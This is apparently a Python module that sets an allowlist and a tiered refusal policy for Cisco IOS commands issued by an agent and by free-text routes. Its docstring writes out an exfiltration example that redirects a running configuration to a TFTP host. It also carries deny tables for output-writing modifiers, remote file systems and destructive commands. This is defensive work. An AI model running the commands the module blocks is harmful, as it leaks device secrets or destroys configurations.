"""Read-only device commands: ONE allowlist for every free-text path (C61), and the command
policy's tiers (NSOT_READS.md section 11, the operator, 2026-10-08).

A command is read-only when EVERY part of it is, not when its first word is.
The first version of this check (P.3 step 8) looked at the verb alone, and
IOS output modifiers write: ``| redirect <url>``, ``| tee <url>`` and
``| append <url>`` send a command's output to ``flash:`` or to another host.
So ``show running-config | redirect tftp://<host>/x`` passed as "a show
command", and sent a device's whole configuration, secrets included, to an
arbitrary host. The DEVICE was the exfiltration path, so nothing in the tool
saw it: the provider-boundary redaction never touched those bytes. That is
B13's shape (a secret leaving through a path the gate did not examine).

So both halves are allowlists, which a command added to IOS later cannot
outgrow:
- the VERB: show, ping, traceroute, dir, more;
- the OUTPUT MODIFIER after the first ``|``: begin, count, exclude,
  include, section, and their unambiguous abbreviations. Anything else is
  refused.

**What follows the modifier is its regular expression, measured**
(2026-09-27, IOS-XE 17.6 and vIOS 15.2, `tests/fixtures/operational/`):
``show version | include Cisco | count`` prints the matching lines, not a
count, on both. So a later ``|`` is regex alternation there, and the
pipeline's own ``show interfaces | include (line protocol|Internet address)``
is a read. The first version of this module split on every ``|`` and refused
that read. A later segment is refused only when its first word could name a
modifier that is not a filter (``| include a|redirect x``): harmless here,
and a write on any platform that does chain pipes, so it fails closed.

Also refused, because each makes a "read" do something else:
- a URL anywhere (``://``): the device reaching another host, in either
  direction;
- ``ping`` or ``traceroute`` with no target: the extended dialogue asks
  questions, and the answers would arrive as the next "commands";
- a line break, a control character or ``?``: each is line editing, and
  can leave a partial command at the device's prompt for the next line to
  complete.

**Every argument is one token of its shape (the tiers, 2026-10-08).** The verbs alone let
``dir tftp:`` and ``more ftp:x`` through (a remote file system with no ``://``: the device
reaching another host, or asking for one), and ``ping <target> repeat 100000`` (a read that holds
the device for hours). So ping and traceroute take only their listed options, each number within
its bound and the run's worst case within `BOUND_SECONDS`; dir and more name only a LOCAL file
system; nothing else follows.

**The tiers.** Tier 1 is non-destructive and runs as a read through the reads engine
(`modules/nsot/reads.py`: refused first, held, masked, capped, recorded). Its reads are the five
verbs above; its other members are `EXTRAS`, which a caller names to allow: ``verify /md5`` of a
local file (a read, of a file), ``send log`` (one plain line into the device's log) and the
session-only terminal settings. The default allows none of them, so the v1 routes and the
connection guard keep the five verbs they had (no new capability on a v1 page), and the agent is
given ``verify`` only. Tier 2 (recoverable, changes state) and Tier 3 (destructive) are REFUSED
here, each naming its tier and where to go instead (`_TIERS`); anything in no tier is refused,
naming the nearest Tier 1 verb.

**Read-only is not "changes nothing" in every sense, and this list keeps the
difference visible:** ``clear`` and ``debug`` are exec commands that change
state (``clear ip ospf process`` drops adjacencies, ``clear counters`` erases
the evidence a diagnosis reads, ``debug`` loads the device) and are NOT here
(NSOT_FEATURE_AUDIT 3a).

Used by the agent's ``execute_*`` tools, and as a REFUSAL by ``/run_command`` and
``bulk_execute`` (C570, 2026-10-08: they had used it only to decide whether to hold the device,
and then ran anything; ``tests/test_device_text_is_refused.py``). The connection layer's guard
(``connection._guard_writes``) refuses any unheld non-read on every session besides.
"""

import difflib
import logging
import re

log = logging.getLogger(__name__)

READ_ONLY_VERBS = ("show", "sho", "sh", "ping", "traceroute", "dir", "more")

#: Tier 1's members beyond the reads, allowed only where a caller names them (`refusal`'s
#: *extra*): the reads engine names all three for a person, `verify` for the agent.
EXTRAS = ("verify", "send log", "terminal")

#: Output modifiers that only filter what is displayed.
SAFE_MODIFIERS = ("begin", "count", "exclude", "include", "section")

#: Modifiers IOS offers that are not filters. Listed so an abbreviation that
#: could mean one of them is refused, and so the refusal can say why. The
#: refusal itself is decided by SAFE_MODIFIERS: an unknown word is refused too.
OTHER_MODIFIERS = ("append", "format", "redirect", "tee")
WRITING_MODIFIERS = ("append", "redirect", "tee")

TARGET_VERBS = ("ping", "traceroute")

#: A ping's or traceroute's worst case, in seconds, from its own arguments and IOS's defaults:
#: the reads engine holds the device that long at most. 300 s: a plain ``traceroute`` to a
#: target that never answers is 270 s (3 probes x 3 s x 30 hops, IOS's defaults), and is
#: allowed; the engine waits the worst case plus `SLACK_SECONDS` for the answer.
BOUND_SECONDS = 300
SLACK_SECONDS = 30

#: ping: option -> (low, high) for a number, None for a flag, "token" for a name. IOS's
#: defaults: repeat 5, timeout 2 s, size 100. repeat to 100 (a loss measurement; more is a
#: flood), size to 1500 (beyond it the probe fragments), timeout to 10 s.
PING_OPTIONS = {"repeat": (1, 100), "size": (36, 1500), "timeout": (0, 10),
                "source": "token", "df-bit": None}
PING_DEFAULTS = {"repeat": 5, "timeout": 2}
#: traceroute: IOS's defaults probe 3, timeout 3 s, ttl 1 to 30.
TRACE_OPTIONS = {"numeric": None, "timeout": (1, 10), "probe": (1, 5), "source": "token",
                 "ttl": "range", "port": (1, 65535)}
TRACE_DEFAULTS = {"probe": 3, "timeout": 3, "ttl": (1, 30)}

#: A local file system: the device's own storage, never a transfer protocol (tftp:, ftp:,
#: http:, https:, scp:, sftp:, rcp: are each the device reaching another host).
LOCAL_FS = re.compile(r"(flash|bootflash|nvram|system|crashinfo|harddisk|disk|slot|usbflash|webui|"
                      r"stby-bootflash|stby-harddisk|stby-nvram)[0-9]{0,2}\Z", re.I)
_PATH = re.compile(r"[A-Za-z0-9_+./-]{1,200}\Z")
_TOKEN = re.compile(r"[A-Za-z0-9][A-Za-z0-9_.:/-]{0,63}\Z")
_TARGET = re.compile(r"[A-Za-z0-9][A-Za-z0-9.:_-]{0,252}\Z")
_VRF = re.compile(r"[A-Za-z0-9_.-]{1,32}\Z")
_MD5 = re.compile(r"[0-9a-fA-F]{32}\Z")

#: send log: the level IOS takes (0 emergencies to 7 debugging) and one line of plain text.
#: 120 characters: a syslog line's message part, kept short enough that the receiving
#: collector never splits it; the cap is a choice, named in the refusal.
SEND_LOG_TEXT_MAX = 120
_SEND_LOG_TEXT = re.compile(r"[ -~]{1,%d}\Z" % SEND_LOG_TEXT_MAX)

#: The session-only terminal settings: they end with the session the engine opens and closes.
TERMINAL_SETTINGS = (("length", (0, 512)), ("width", (0, 512)))

_EXTRA_WORDS = {"verify": "verify /md5 of a local file", "send log": "send log",
                "terminal": "terminal length or width"}


def _tier1_words(extra=()) -> str:
    """What runs on this path, in words: the reads, and the extras *extra* names."""
    parts = ["show", "ping and traceroute (bounded)", "dir and more of a local file system"]
    parts += [_EXTRA_WORDS[e] for e in EXTRAS if e in (extra or ())]
    return ("Tier 1 (non-destructive) runs here: " + "; ".join(parts) + ". Output is filtered "
            "only by include, exclude, begin, section or count")


_TAIL = (f"{_tier1_words()}. A change is a plan a person confirms.")

_TIER2 = ("Tier 2: it changes the device's state, recoverably. It will be the \"Run a privileged "
          "command\" operation (a preview of what it affects, a confirm, a record), drafted "
          "and not built yet. Nothing was sent.")
_RELOAD = ("Tier 3: it restarts the device. A restart is an operation, Reload (P.14), built "
           "with Revert by reload (Phase 2), and not on v2 yet. Nothing was sent.")
_CONFIGURE = ("Configure mode runs only in the deploy pipeline: change the device's intent and "
              "deploy it (a preview, a confirm by hash, verify, rollback). Nothing was sent.")
_SAVE = ("It saves the running configuration: the deploy pipeline saves after it verifies, and "
         "the device page's Persist saves on its own. Nothing was sent.")
_WRITE_TERMINAL = ("It prints the running configuration: ask `show running-config`, a Tier 1 "
                   "read. Nothing was sent.")
_FILES = ("Tier 3: it changes or destroys the device's files or its saved configuration; no "
          "Mercury operation does that by free text. Nothing was sent.")
_COPY = ("Tier 3: copy moves configurations and files into or off the device. A configuration "
         "reaches a device by deploy, and a golden is taken by Capture. Nothing was sent.")
_DEBUG = ("Tier 3: debug loads the device's CPU, and its output goes to the log. The device's "
          "logs are read from Loki (the device page's Logs tab). `undebug all` is Tier 2. "
          "Nothing was sent.")
_CLEAR = ("Tier 3: this clear drops adjacencies or sessions (a hard reset). Its recoverable "
          "forms are Tier 2: clear counters, clear arp-cache, clear ip bgp <peer> soft, clear "
          "logging. Nothing was sent.")
_ZEROIZE = ("Tier 3: it destroys the device's keys, the SSH key Mercury reaches it with among "
            "them. Nothing was sent.")
_INSTALL = ("Tier 3: it installs or changes the device's software. Nothing was sent.")

#: (words, why): the first entry whose words the command abbreviates decides. Longer entries
#: first, so `clear counters` is Tier 2 before `clear` is Tier 3.
_TIERS = (
    (("clear", "counters"), _TIER2), (("clear", "arp-cache"), _TIER2),
    (("clear", "logging"), _TIER2), (("undebug", "all"), _TIER2),
    (("no", "debug", "all"), _TIER2),
    (("clear",), _CLEAR), (("debug",), _DEBUG), (("undebug",), _DEBUG),
    (("reload",), _RELOAD),
    (("configure",), _CONFIGURE),
    (("write", "erase"), _FILES), (("write", "terminal"), _WRITE_TERMINAL),
    (("write",), _SAVE),            # `write` and `write memory` both save
    (("copy", "running-config", "startup-config"), _SAVE),
    (("erase",), _FILES), (("delete",), _FILES), (("format",), _FILES),
    (("squeeze",), _FILES), (("rename",), _FILES), (("mkdir",), _FILES), (("rmdir",), _FILES),
    (("fsck",), _FILES),
    (("copy",), _COPY),
    (("crypto",), _ZEROIZE),
    (("request",), _INSTALL), (("install",), _INSTALL), (("software",), _INSTALL),
)

#: Every first word a tier names, and Tier 1's, for the nearest-verb suggestion.
_KNOWN_VERBS = tuple(v for v in READ_ONLY_VERBS if v not in ("sh", "sho")) + ("verify", "send", "terminal")


def _abbreviates(words: list, full: tuple) -> bool:
    """*words* abbreviate *full*, word by word, in order (IOS's prefixes: `sh`, `conf t`)."""
    if len(words) < len(full):
        return False
    return all(f.startswith(w) and (len(w) >= 2 or w == f) for w, f in zip(words, full))


def _tier_refusal(words: list) -> str:
    low = [w.lower() for w in words]
    # `clear ip bgp <peer> soft` is Tier 2; `clear ip bgp *` and a hard reset are Tier 3.
    if (len(low) >= 5 and _abbreviates(low[:3], ("clear", "ip", "bgp")) and low[-1] in
            ("soft", "in", "out") and "*" not in low):
        return _TIER2
    for full, why in _TIERS:
        if _abbreviates(low, full):
            return why
    return ""


def _modifier_is_safe(word: str) -> bool:
    """An unambiguous prefix of a filtering modifier, and of nothing else."""
    word = word.lower()
    if not any(m.startswith(word) for m in SAFE_MODIFIERS):
        return False
    return not any(m.startswith(word) for m in OTHER_MODIFIERS)


def _number(value: str, low: int, high: int):
    return int(value) if value.isdigit() and low <= int(value) <= high else None


def _target_args(verb: str, args: list):
    """``(why, worst_seconds)`` for a ping's or traceroute's arguments after the verb."""
    if len(args) == 1 and args[0].lower() == "vrf":
        return f"REFUSED: {verb} vrf needs the VRF's name, then the target.", 0
    if len(args) >= 2 and args[0].lower() == "vrf":
        if not _VRF.match(args[1]):
            return f"REFUSED: {args[1]!r} is not a VRF name (letters, digits, _ . -).", 0
        args = args[2:]
    if args and args[0].lower() in ("ip", "ipv6"):
        args = args[1:]
    if not args:
        return (f"REFUSED: {verb} with no target starts an interactive dialogue; give the "
                "address."), 0
    if not _TARGET.match(args[0]):
        return f"REFUSED: {verb}'s target {args[0][:60]!r} is not an address or a host name.", 0
    options = PING_OPTIONS if verb == "ping" else TRACE_OPTIONS
    got = dict(PING_DEFAULTS if verb == "ping" else TRACE_DEFAULTS)
    rest, i = args[1:], 0
    while i < len(rest):
        word = rest[i].lower()
        if word not in options:
            allowed = ", ".join(options)
            return (f"REFUSED: {word!r} is not one of {verb}'s options here ({allowed}, each "
                    "word in full)."), 0
        kind = options[word]
        if kind is None:
            i += 1
            continue
        if kind == "range":
            pair = rest[i + 1:i + 3]
            low = _number(pair[0], 1, 30) if len(pair) == 2 else None
            high = _number(pair[1], 1, 30) if len(pair) == 2 else None
            if low is None or high is None or low > high:
                return (f"REFUSED: {verb} ttl takes two numbers, a minimum and a maximum, "
                        "1 to 30."), 0
            got["ttl"] = (low, high)
            i += 3
            continue
        if i + 1 >= len(rest):
            return f"REFUSED: {verb}'s {word} needs a value.", 0
        value = rest[i + 1]
        if kind == "token":
            if not _TOKEN.match(value):
                return (f"REFUSED: {verb}'s {word} {value[:40]!r} is not an interface or an "
                        "address."), 0
        else:
            n = _number(value, *kind)
            if n is None:
                return (f"REFUSED: {verb}'s {word} is {value[:20]!r}; it must be a whole "
                        f"number from {kind[0]} to {kind[1]}."), 0
            got[word] = n
        i += 2
    if verb == "ping":
        worst = got["repeat"] * max(1, got["timeout"])
        words = f"repeat {got['repeat']} x timeout {got['timeout']} s"
    else:
        low, high = got["ttl"]
        worst = got["probe"] * got["timeout"] * (high - low + 1)
        words = (f"probe {got['probe']} x timeout {got['timeout']} s x "
                 f"{high - low + 1} hops (ttl {low} to {high})")
    if worst > BOUND_SECONDS:
        return (f"REFUSED: {verb}'s worst case is {words} = {worst} s, past the "
                f"{BOUND_SECONDS} s a read may hold the device. Lower the timeout, the "
                f"{'repeat' if verb == 'ping' else 'probes or the ttl range'}."), 0
    return "", worst


def _file(arg: str, verb: str) -> str:
    """``""`` when *arg* names a file or directory on a LOCAL file system, else why."""
    if ":" in arg:
        fs, _, path = arg.partition(":")
        if not LOCAL_FS.match(fs):
            return (f"REFUSED: {fs}: is not a local file system; {verb} reads only the "
                    "device's own storage (flash:, bootflash:, nvram:, ...), never a transfer "
                    "to or from another host.")
        if path and not _PATH.match(path):
            return (f"REFUSED: {path[:60]!r} is not a file path (letters, digits and "
                    "_ + . / -).")
        return ""
    if not _PATH.match(arg):
        return f"REFUSED: {arg[:60]!r} is not a file path (letters, digits and _ + . / -)."
    return ""


def _file_args(verb: str, args: list) -> str:
    flags = {"dir": ("/all", "/recursive"), "more": ("/ascii", "/binary", "/ebcdic")}[verb]
    while args and args[0].startswith("/"):
        if args[0].lower() not in flags:
            return f"REFUSED: {args[0]!r} is not one of {verb}'s options here ({', '.join(flags)})."
        args = args[1:]
    if verb == "more" and not args:
        return "REFUSED: more needs a file to read, on a local file system (flash:<file>)."
    if len(args) > 1:
        return f"REFUSED: {verb} reads one file system or file; {' '.join(args[1:])[:60]!r} follows it."
    return _file(args[0], verb) if args else ""


def _verify_args(args: list) -> str:
    if not args or args[0].lower() != "/md5":
        return "REFUSED: verify runs here only as verify /md5 <local file> [<expected md5>]."
    args = args[1:]
    if not args:
        return "REFUSED: verify /md5 needs a file on a local file system (flash:<file>)."
    if len(args) > 2:
        return "REFUSED: verify /md5 takes one file and, optionally, the MD5 it should have."
    if len(args) == 2 and not _MD5.match(args[1]):
        return f"REFUSED: {args[1][:40]!r} is not an MD5 (32 hexadecimal digits)."
    return _file(args[0], "verify")


def _send_log_args(text: str) -> str:
    """``send log [<0-7>] <text>``: *text* is everything after ``send log``."""
    words = text.split(None, 1)
    if words and words[0].isdigit():
        if not 0 <= int(words[0]) <= 7:
            return f"REFUSED: send log's level is {words[0]}; it must be 0 to 7."
        text = words[1] if len(words) > 1 else ""
    text = text.strip()
    if not text:
        return "REFUSED: send log needs the line to write."
    if "|" in text:
        return "REFUSED: send log's line holds '|'; it is one plain line, never piped."
    if len(text) > SEND_LOG_TEXT_MAX:
        return (f"REFUSED: send log's line is {len(text)} characters; it must be at most "
                f"{SEND_LOG_TEXT_MAX}.")
    if not _SEND_LOG_TEXT.match(text):
        return "REFUSED: send log's line holds a character that is not plain printable text."
    return ""


def _terminal_args(args: list) -> str:
    for word, (low, high) in TERMINAL_SETTINGS:
        if len(args) == 2 and args[0].lower() == word and _number(args[1], low, high) is not None:
            return ""
    shown = " or ".join(f"terminal {w} <{lo}-{hi}>" for w, (lo, hi) in TERMINAL_SETTINGS)
    return f"REFUSED: the terminal settings that run here are {shown}, for this session only."


def _unknown(verb: str, extra: tuple) -> str:
    near = difflib.get_close_matches(verb.lower(), _KNOWN_VERBS, n=1, cutoff=0.6)
    hint = f" Did you mean {near[0]!r}?" if near else ""
    return (f"REFUSED: {verb!r} is in no tier of Mercury's command policy, so it is refused. "
            f"{_tier1_words(extra)}.{hint}")


def refusal(command, extra=()) -> str:
    """A refusal naming the reason, or "" when *command* may run.

    By default only the reads (`READ_ONLY_VERBS`). *extra* names Tier 1's other members a caller
    allows (`EXTRAS`): the reads engine passes them for a person."""
    text = command if isinstance(command, str) else ""
    extra = tuple(e for e in (extra or ()) if e in EXTRAS)
    if "\n" in text or "\r" in text:
        return f"REFUSED: one command per entry, no line breaks: {text[:60]!r}"
    if any(ord(c) < 32 or ord(c) == 127 for c in text):
        return "REFUSED: a control character is line editing, not a command."
    stripped = text.strip()
    if not stripped:
        return f"REFUSED: '(empty)' is not a command. {_TAIL}"
    if "?" in stripped:
        return ("REFUSED: '?' is the CLI's inline help; it leaves a partial "
                "command at the prompt for the next line to complete.")
    words_all = stripped.split()
    verb_all = words_all[0].lower()
    if [w.lower() for w in words_all[:2]] == ["send", "log"]:
        if "send log" not in extra:
            return ("REFUSED: send log is Tier 1, and runs only through the reads engine (Show "
                    "commands, Ask the device), which holds the device and records the run.")
        rest = stripped.split(None, 2)
        return _send_log_args(rest[2] if len(rest) > 2 else "")
    head, *modifiers = stripped.split("|")
    words = head.split()
    verb = words[0].lower() if words else ""
    if len(verb) >= 4 and "terminal".startswith(verb):
        verb = "terminal"
    if verb in ("verify", "terminal"):
        if verb not in extra:
            return (f"REFUSED: {verb} is Tier 1, and runs only through the reads engine (Show "
                    "commands, Ask the device), which holds the device and records the run.")
        if verb == "terminal":
            if modifiers:
                return "REFUSED: a terminal setting prints nothing to filter; no '|' after it."
            return _terminal_args(words[1:])
    elif verb not in READ_ONLY_VERBS:
        tier = _tier_refusal(words_all)
        if tier:
            return f"REFUSED: {' '.join(words_all)[:60]!r}: {tier}"
        return _unknown(verb_all or "(empty)", extra)
    if "://" in stripped:
        return ("REFUSED: a URL makes the device reach another host, so this is "
                "not a read of this device.")
    check = {"ping": lambda a: _target_args("ping", a)[0],
             "traceroute": lambda a: _target_args("traceroute", a)[0],
             "dir": lambda a: _file_args("dir", a), "more": lambda a: _file_args("more", a),
             "verify": _verify_args}.get(verb)
    why = check(words[1:]) if check else ""
    if why:
        return why
    for position, modifier in enumerate(modifiers):
        parts = modifier.split()
        word = parts[0] if parts else ""
        if not word:
            return "REFUSED: an empty output modifier after '|'."
        could_be_other = any(m.startswith(word.lower()) for m in OTHER_MODIFIERS)
        if position == 0 and _modifier_is_safe(word):
            continue
        if position > 0 and not could_be_other:
            continue    # part of the filter's regular expression
        writes = any(m.startswith(word.lower()) for m in WRITING_MODIFIERS)
        why = (" It WRITES the output to a file or another host." if writes
               else "")
        return (f"REFUSED: output modifier {word!r} is not a filter.{why} "
                f"{_TAIL}")
    return ""


def bound_seconds(command: str) -> int:
    """How long the reads engine waits for *command*'s answer: a ping's or traceroute's worst
    case (from its arguments and IOS's defaults) plus `SLACK_SECONDS`, else 0 (the read
    timeout's own bound)."""
    words = (command or "").split("|", 1)[0].split()
    if not words or words[0].lower() not in TARGET_VERBS:
        return 0
    why, worst = _target_args(words[0].lower(), words[1:])
    return 0 if why else worst + SLACK_SECONDS


def refusal_for(commands, extra=()) -> str:
    """The first refusal among *commands*, or "" when all may run."""
    for command in commands or []:
        reason = refusal(command, extra)
        if reason:
            return reason
    return ""
